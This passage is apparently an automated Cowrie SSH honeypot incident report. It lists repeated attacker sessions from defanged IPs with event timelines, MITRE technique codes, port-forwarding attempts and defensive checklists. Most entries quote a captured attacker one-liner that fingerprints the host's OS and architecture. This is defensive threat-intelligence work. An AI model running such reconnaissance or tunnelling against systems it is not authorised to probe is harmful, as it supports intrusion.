| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 07:01:46` | `cowrie.session.connect` |
| `2026-09-05 07:01:46` | `cowrie.client.version` |
| `2026-09-05 07:01:46` | `cowrie.client.kex` |
| `2026-09-05 07:01:48` | `cowrie.login.success` |
| `2026-09-05 07:01:50` | `cowrie.session.params` |
| `2026-09-05 07:01:50` | `cowrie.command.input` |
| `2026-09-05 07:01:50` | `cowrie.command.input` |
| `2026-09-05 07:01:50` | `cowrie.command.input` |
| `2026-09-05 07:01:50` | `cowrie.command.input` |
| `2026-09-05 07:01:50` | `cowrie.command.input` |
| `2026-09-05 07:01:50` | `cowrie.command.success` |
| `2026-09-05 07:01:50` | `cowrie.command.input` |
| `2026-09-05 07:01:50` | `cowrie.command.input` |
| `2026-09-05 07:01:50` | `cowrie.command.input` |
| `2026-09-05 07:01:50` | `cowrie.command.input` |
| `2026-09-05 07:01:51` | `cowrie.log.closed` |
| `2026-09-05 07:01:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6a39cdcab7f

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-05 07:04 |
| **Last Seen** | 2026-09-05 07:04 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 07:04:04` | `cowrie.session.connect` |
| `2026-09-05 07:04:04` | `cowrie.client.version` |
| `2026-09-05 07:04:04` | `cowrie.client.kex` |
| `2026-09-05 07:04:06` | `cowrie.login.success` |
| `2026-09-05 07:04:08` | `cowrie.session.params` |
| `2026-09-05 07:04:08` | `cowrie.command.input` |
| `2026-09-05 07:04:08` | `cowrie.command.input` |
| `2026-09-05 07:04:08` | `cowrie.command.input` |
| `2026-09-05 07:04:08` | `cowrie.command.input` |
| `2026-09-05 07:04:08` | `cowrie.command.input` |
| `2026-09-05 07:04:08` | `cowrie.command.success` |
| `2026-09-05 07:04:08` | `cowrie.command.input` |
| `2026-09-05 07:04:08` | `cowrie.command.input` |
| `2026-09-05 07:04:08` | `cowrie.command.input` |
| `2026-09-05 07:04:08` | `cowrie.command.input` |
| `2026-09-05 07:04:09` | `cowrie.log.closed` |
| `2026-09-05 07:04:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a11b1bed71bf

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-05 07:06 |
| **Last Seen** | 2026-09-05 07:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 07:06:22` | `cowrie.session.connect` |
| `2026-09-05 07:06:22` | `cowrie.client.version` |
| `2026-09-05 07:06:22` | `cowrie.client.kex` |
| `2026-09-05 07:06:24` | `cowrie.login.success` |
| `2026-09-05 07:06:26` | `cowrie.session.params` |
| `2026-09-05 07:06:26` | `cowrie.command.input` |
| `2026-09-05 07:06:26` | `cowrie.command.input` |
| `2026-09-05 07:06:26` | `cowrie.command.input` |
| `2026-09-05 07:06:26` | `cowrie.command.input` |
| `2026-09-05 07:06:26` | `cowrie.command.input` |
| `2026-09-05 07:06:26` | `cowrie.command.success` |
| `2026-09-05 07:06:26` | `cowrie.command.input` |
| `2026-09-05 07:06:26` | `cowrie.command.input` |
| `2026-09-05 07:06:26` | `cowrie.command.input` |
| `2026-09-05 07:06:26` | `cowrie.command.input` |
| `2026-09-05 07:06:26` | `cowrie.log.closed` |
| `2026-09-05 07:06:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5a76d8e2aa0

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-05 07:08 |
| **Last Seen** | 2026-09-05 07:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 07:08:40` | `cowrie.session.connect` |
| `2026-09-05 07:08:40` | `cowrie.client.version` |
| `2026-09-05 07:08:40` | `cowrie.client.kex` |
| `2026-09-05 07:08:42` | `cowrie.login.success` |
| `2026-09-05 07:08:43` | `cowrie.session.params` |
| `2026-09-05 07:08:43` | `cowrie.command.input` |
| `2026-09-05 07:08:43` | `cowrie.command.input` |
| `2026-09-05 07:08:43` | `cowrie.command.input` |
| `2026-09-05 07:08:43` | `cowrie.command.input` |
| `2026-09-05 07:08:43` | `cowrie.command.input` |
| `2026-09-05 07:08:43` | `cowrie.command.success` |
| `2026-09-05 07:08:43` | `cowrie.command.input` |
| `2026-09-05 07:08:43` | `cowrie.command.input` |
| `2026-09-05 07:08:43` | `cowrie.command.input` |
| `2026-09-05 07:08:43` | `cowrie.command.input` |
| `2026-09-05 07:08:43` | `cowrie.log.closed` |
| `2026-09-05 07:08:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d33b62d4ea05

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-05 07:08 |
| **Last Seen** | 2026-09-05 07:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 07:08:49` | `cowrie.session.connect` |
| `2026-09-05 07:08:49` | `cowrie.client.version` |
| `2026-09-05 07:08:49` | `cowrie.client.kex` |
| `2026-09-05 07:08:50` | `cowrie.login.success` |
| `2026-09-05 07:08:50` | `cowrie.direct-tcpip.request` |
| `2026-09-05 07:08:50` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-05 07:08:50` | `cowrie.direct-tcpip.data` |
| `2026-09-05 07:08:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da269032dc9c

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-05 07:11 |
| **Last Seen** | 2026-09-05 07:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 07:11:00` | `cowrie.session.connect` |
| `2026-09-05 07:11:00` | `cowrie.client.version` |
| `2026-09-05 07:11:00` | `cowrie.client.kex` |
| `2026-09-05 07:11:01` | `cowrie.login.success` |
| `2026-09-05 07:11:02` | `cowrie.session.params` |
| `2026-09-05 07:11:02` | `cowrie.command.input` |
| `2026-09-05 07:11:02` | `cowrie.command.input` |
| `2026-09-05 07:11:02` | `cowrie.command.input` |
| `2026-09-05 07:11:02` | `cowrie.command.input` |
| `2026-09-05 07:11:02` | `cowrie.command.input` |
| `2026-09-05 07:11:02` | `cowrie.command.success` |
| `2026-09-05 07:11:02` | `cowrie.command.input` |
| `2026-09-05 07:11:02` | `cowrie.command.input` |
| `2026-09-05 07:11:02` | `cowrie.command.input` |
| `2026-09-05 07:11:02` | `cowrie.command.input` |
| `2026-09-05 07:11:02` | `cowrie.log.closed` |
| `2026-09-05 07:11:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d277071082fe

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-05 07:13 |
| **Last Seen** | 2026-09-05 07:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 07:13:26` | `cowrie.session.connect` |
| `2026-09-05 07:13:26` | `cowrie.client.version` |
| `2026-09-05 07:13:26` | `cowrie.client.kex` |
| `2026-09-05 07:13:27` | `cowrie.login.success` |
| `2026-09-05 07:13:28` | `cowrie.session.params` |
| `2026-09-05 07:13:28` | `cowrie.command.input` |
| `2026-09-05 07:13:28` | `cowrie.command.input` |
| `2026-09-05 07:13:28` | `cowrie.command.input` |
| `2026-09-05 07:13:28` | `cowrie.command.input` |
| `2026-09-05 07:13:28` | `cowrie.command.input` |
| `2026-09-05 07:13:28` | `cowrie.command.success` |
| `2026-09-05 07:13:28` | `cowrie.command.input` |
| `2026-09-05 07:13:28` | `cowrie.command.input` |
| `2026-09-05 07:13:28` | `cowrie.command.input` |
| `2026-09-05 07:13:28` | `cowrie.command.input` |
| `2026-09-05 07:13:29` | `cowrie.log.closed` |
| `2026-09-05 07:13:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a65c4f5e8b1b

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-05 07:15 |
| **Last Seen** | 2026-09-05 07:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 07:15:45` | `cowrie.session.connect` |
| `2026-09-05 07:15:45` | `cowrie.client.version` |
| `2026-09-05 07:15:45` | `cowrie.client.kex` |
| `2026-09-05 07:15:47` | `cowrie.login.success` |
| `2026-09-05 07:15:48` | `cowrie.session.params` |
| `2026-09-05 07:15:48` | `cowrie.command.input` |
| `2026-09-05 07:15:48` | `cowrie.command.input` |
| `2026-09-05 07:15:48` | `cowrie.command.input` |
| `2026-09-05 07:15:48` | `cowrie.command.input` |
| `2026-09-05 07:15:49` | `cowrie.command.input` |
| `2026-09-05 07:15:49` | `cowrie.command.success` |
| `2026-09-05 07:15:49` | `cowrie.command.input` |
| `2026-09-05 07:15:49` | `cowrie.command.input` |
| `2026-09-05 07:15:49` | `cowrie.command.input` |
| `2026-09-05 07:15:49` | `cowrie.command.input` |
| `2026-09-05 07:15:49` | `cowrie.log.closed` |
| `2026-09-05 07:15:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f008bf8a9175

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-05 07:18 |
| **Last Seen** | 2026-09-05 07:18 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 07:18:03` | `cowrie.session.connect` |
| `2026-09-05 07:18:03` | `cowrie.client.version` |
| `2026-09-05 07:18:03` | `cowrie.client.kex` |
| `2026-09-05 07:18:06` | `cowrie.login.success` |
| `2026-09-05 07:18:07` | `cowrie.session.params` |
| `2026-09-05 07:18:07` | `cowrie.command.input` |
| `2026-09-05 07:18:07` | `cowrie.command.input` |
| `2026-09-05 07:18:07` | `cowrie.command.input` |
| `2026-09-05 07:18:07` | `cowrie.command.input` |
| `2026-09-05 07:18:07` | `cowrie.command.input` |
| `2026-09-05 07:18:07` | `cowrie.command.success` |
| `2026-09-05 07:18:07` | `cowrie.command.input` |
| `2026-09-05 07:18:07` | `cowrie.command.input` |
| `2026-09-05 07:18:07` | `cowrie.command.input` |
| `2026-09-05 07:18:07` | `cowrie.command.input` |
| `2026-09-05 07:18:08` | `cowrie.log.closed` |
| `2026-09-05 07:18:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-136936925777

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-05 07:19 |
| **Last Seen** | 2026-09-05 07:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 07:19:53` | `cowrie.session.connect` |
| `2026-09-05 07:19:53` | `cowrie.client.version` |
| `2026-09-05 07:19:53` | `cowrie.client.kex` |
| `2026-09-05 07:19:54` | `cowrie.login.success` |
| `2026-09-05 07:19:54` | `cowrie.direct-tcpip.request` |
| `2026-09-05 07:19:54` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-05 07:19:54` | `cowrie.direct-tcpip.data` |
| `2026-09-05 07:19:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14306db66bd1

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-05 07:20 |
| **Last Seen** | 2026-09-05 07:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 07:20:21` | `cowrie.session.connect` |
| `2026-09-05 07:20:21` | `cowrie.client.version` |
| `2026-09-05 07:20:21` | `cowrie.client.kex` |
| `2026-09-05 07:20:23` | `cowrie.login.success` |
| `2026-09-05 07:20:24` | `cowrie.session.params` |
| `2026-09-05 07:20:24` | `cowrie.command.input` |
| `2026-09-05 07:20:24` | `cowrie.command.input` |
| `2026-09-05 07:20:24` | `cowrie.command.input` |
| `2026-09-05 07:20:24` | `cowrie.command.input` |
| `2026-09-05 07:20:24` | `cowrie.command.input` |
| `2026-09-05 07:20:24` | `cowrie.command.success` |
| `2026-09-05 07:20:24` | `cowrie.command.input` |
| `2026-09-05 07:20:24` | `cowrie.command.input` |
| `2026-09-05 07:20:24` | `cowrie.command.input` |
| `2026-09-05 07:20:24` | `cowrie.command.input` |
| `2026-09-05 07:20:25` | `cowrie.log.closed` |
| `2026-09-05 07:20:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-068c63ea1c44

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-05 07:22 |
| **Last Seen** | 2026-09-05 07:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 07:22:34` | `cowrie.session.connect` |
| `2026-09-05 07:22:34` | `cowrie.client.version` |
| `2026-09-05 07:22:34` | `cowrie.client.kex` |
| `2026-09-05 07:22:36` | `cowrie.login.success` |
| `2026-09-05 07:22:38` | `cowrie.session.params` |
| `2026-09-05 07:22:38` | `cowrie.command.input` |
| `2026-09-05 07:22:38` | `cowrie.command.input` |
| `2026-09-05 07:22:38` | `cowrie.command.input` |
| `2026-09-05 07:22:38` | `cowrie.command.input` |
| `2026-09-05 07:22:38` | `cowrie.command.input` |
| `2026-09-05 07:22:38` | `cowrie.command.success` |
| `2026-09-05 07:22:38` | `cowrie.command.input` |
| `2026-09-05 07:22:38` | `cowrie.command.input` |
| `2026-09-05 07:22:38` | `cowrie.command.input` |
| `2026-09-05 07:22:38` | `cowrie.command.input` |
| `2026-09-05 07:22:39` | `cowrie.log.closed` |
| `2026-09-05 07:22:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19922736f09b

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-05 07:23 |
| **Last Seen** | 2026-09-05 07:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 07:23:40` | `cowrie.session.connect` |
| `2026-09-05 07:23:40` | `cowrie.client.version` |
| `2026-09-05 07:23:41` | `cowrie.client.kex` |
| `2026-09-05 07:23:41` | `cowrie.login.success` |
| `2026-09-05 07:23:43` | `cowrie.direct-tcpip.request` |
| `2026-09-05 07:23:43` | `cowrie.direct-tcpip.ja4` |
| `2026-09-05 07:23:43` | `cowrie.direct-tcpip.data` |
| `2026-09-05 07:23:44` | `cowrie.direct-tcpip.request` |
| `2026-09-05 07:23:44` | `cowrie.direct-tcpip.ja4` |
| `2026-09-05 07:23:44` | `cowrie.direct-tcpip.data` |
| `2026-09-05 07:23:44` | `cowrie.direct-tcpip.request` |
| `2026-09-05 07:23:44` | `cowrie.direct-tcpip.ja4` |
| `2026-09-05 07:23:44` | `cowrie.direct-tcpip.data` |
| `2026-09-05 07:23:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a46ac1a57fa

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-05 07:24 |
| **Last Seen** | 2026-09-05 07:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
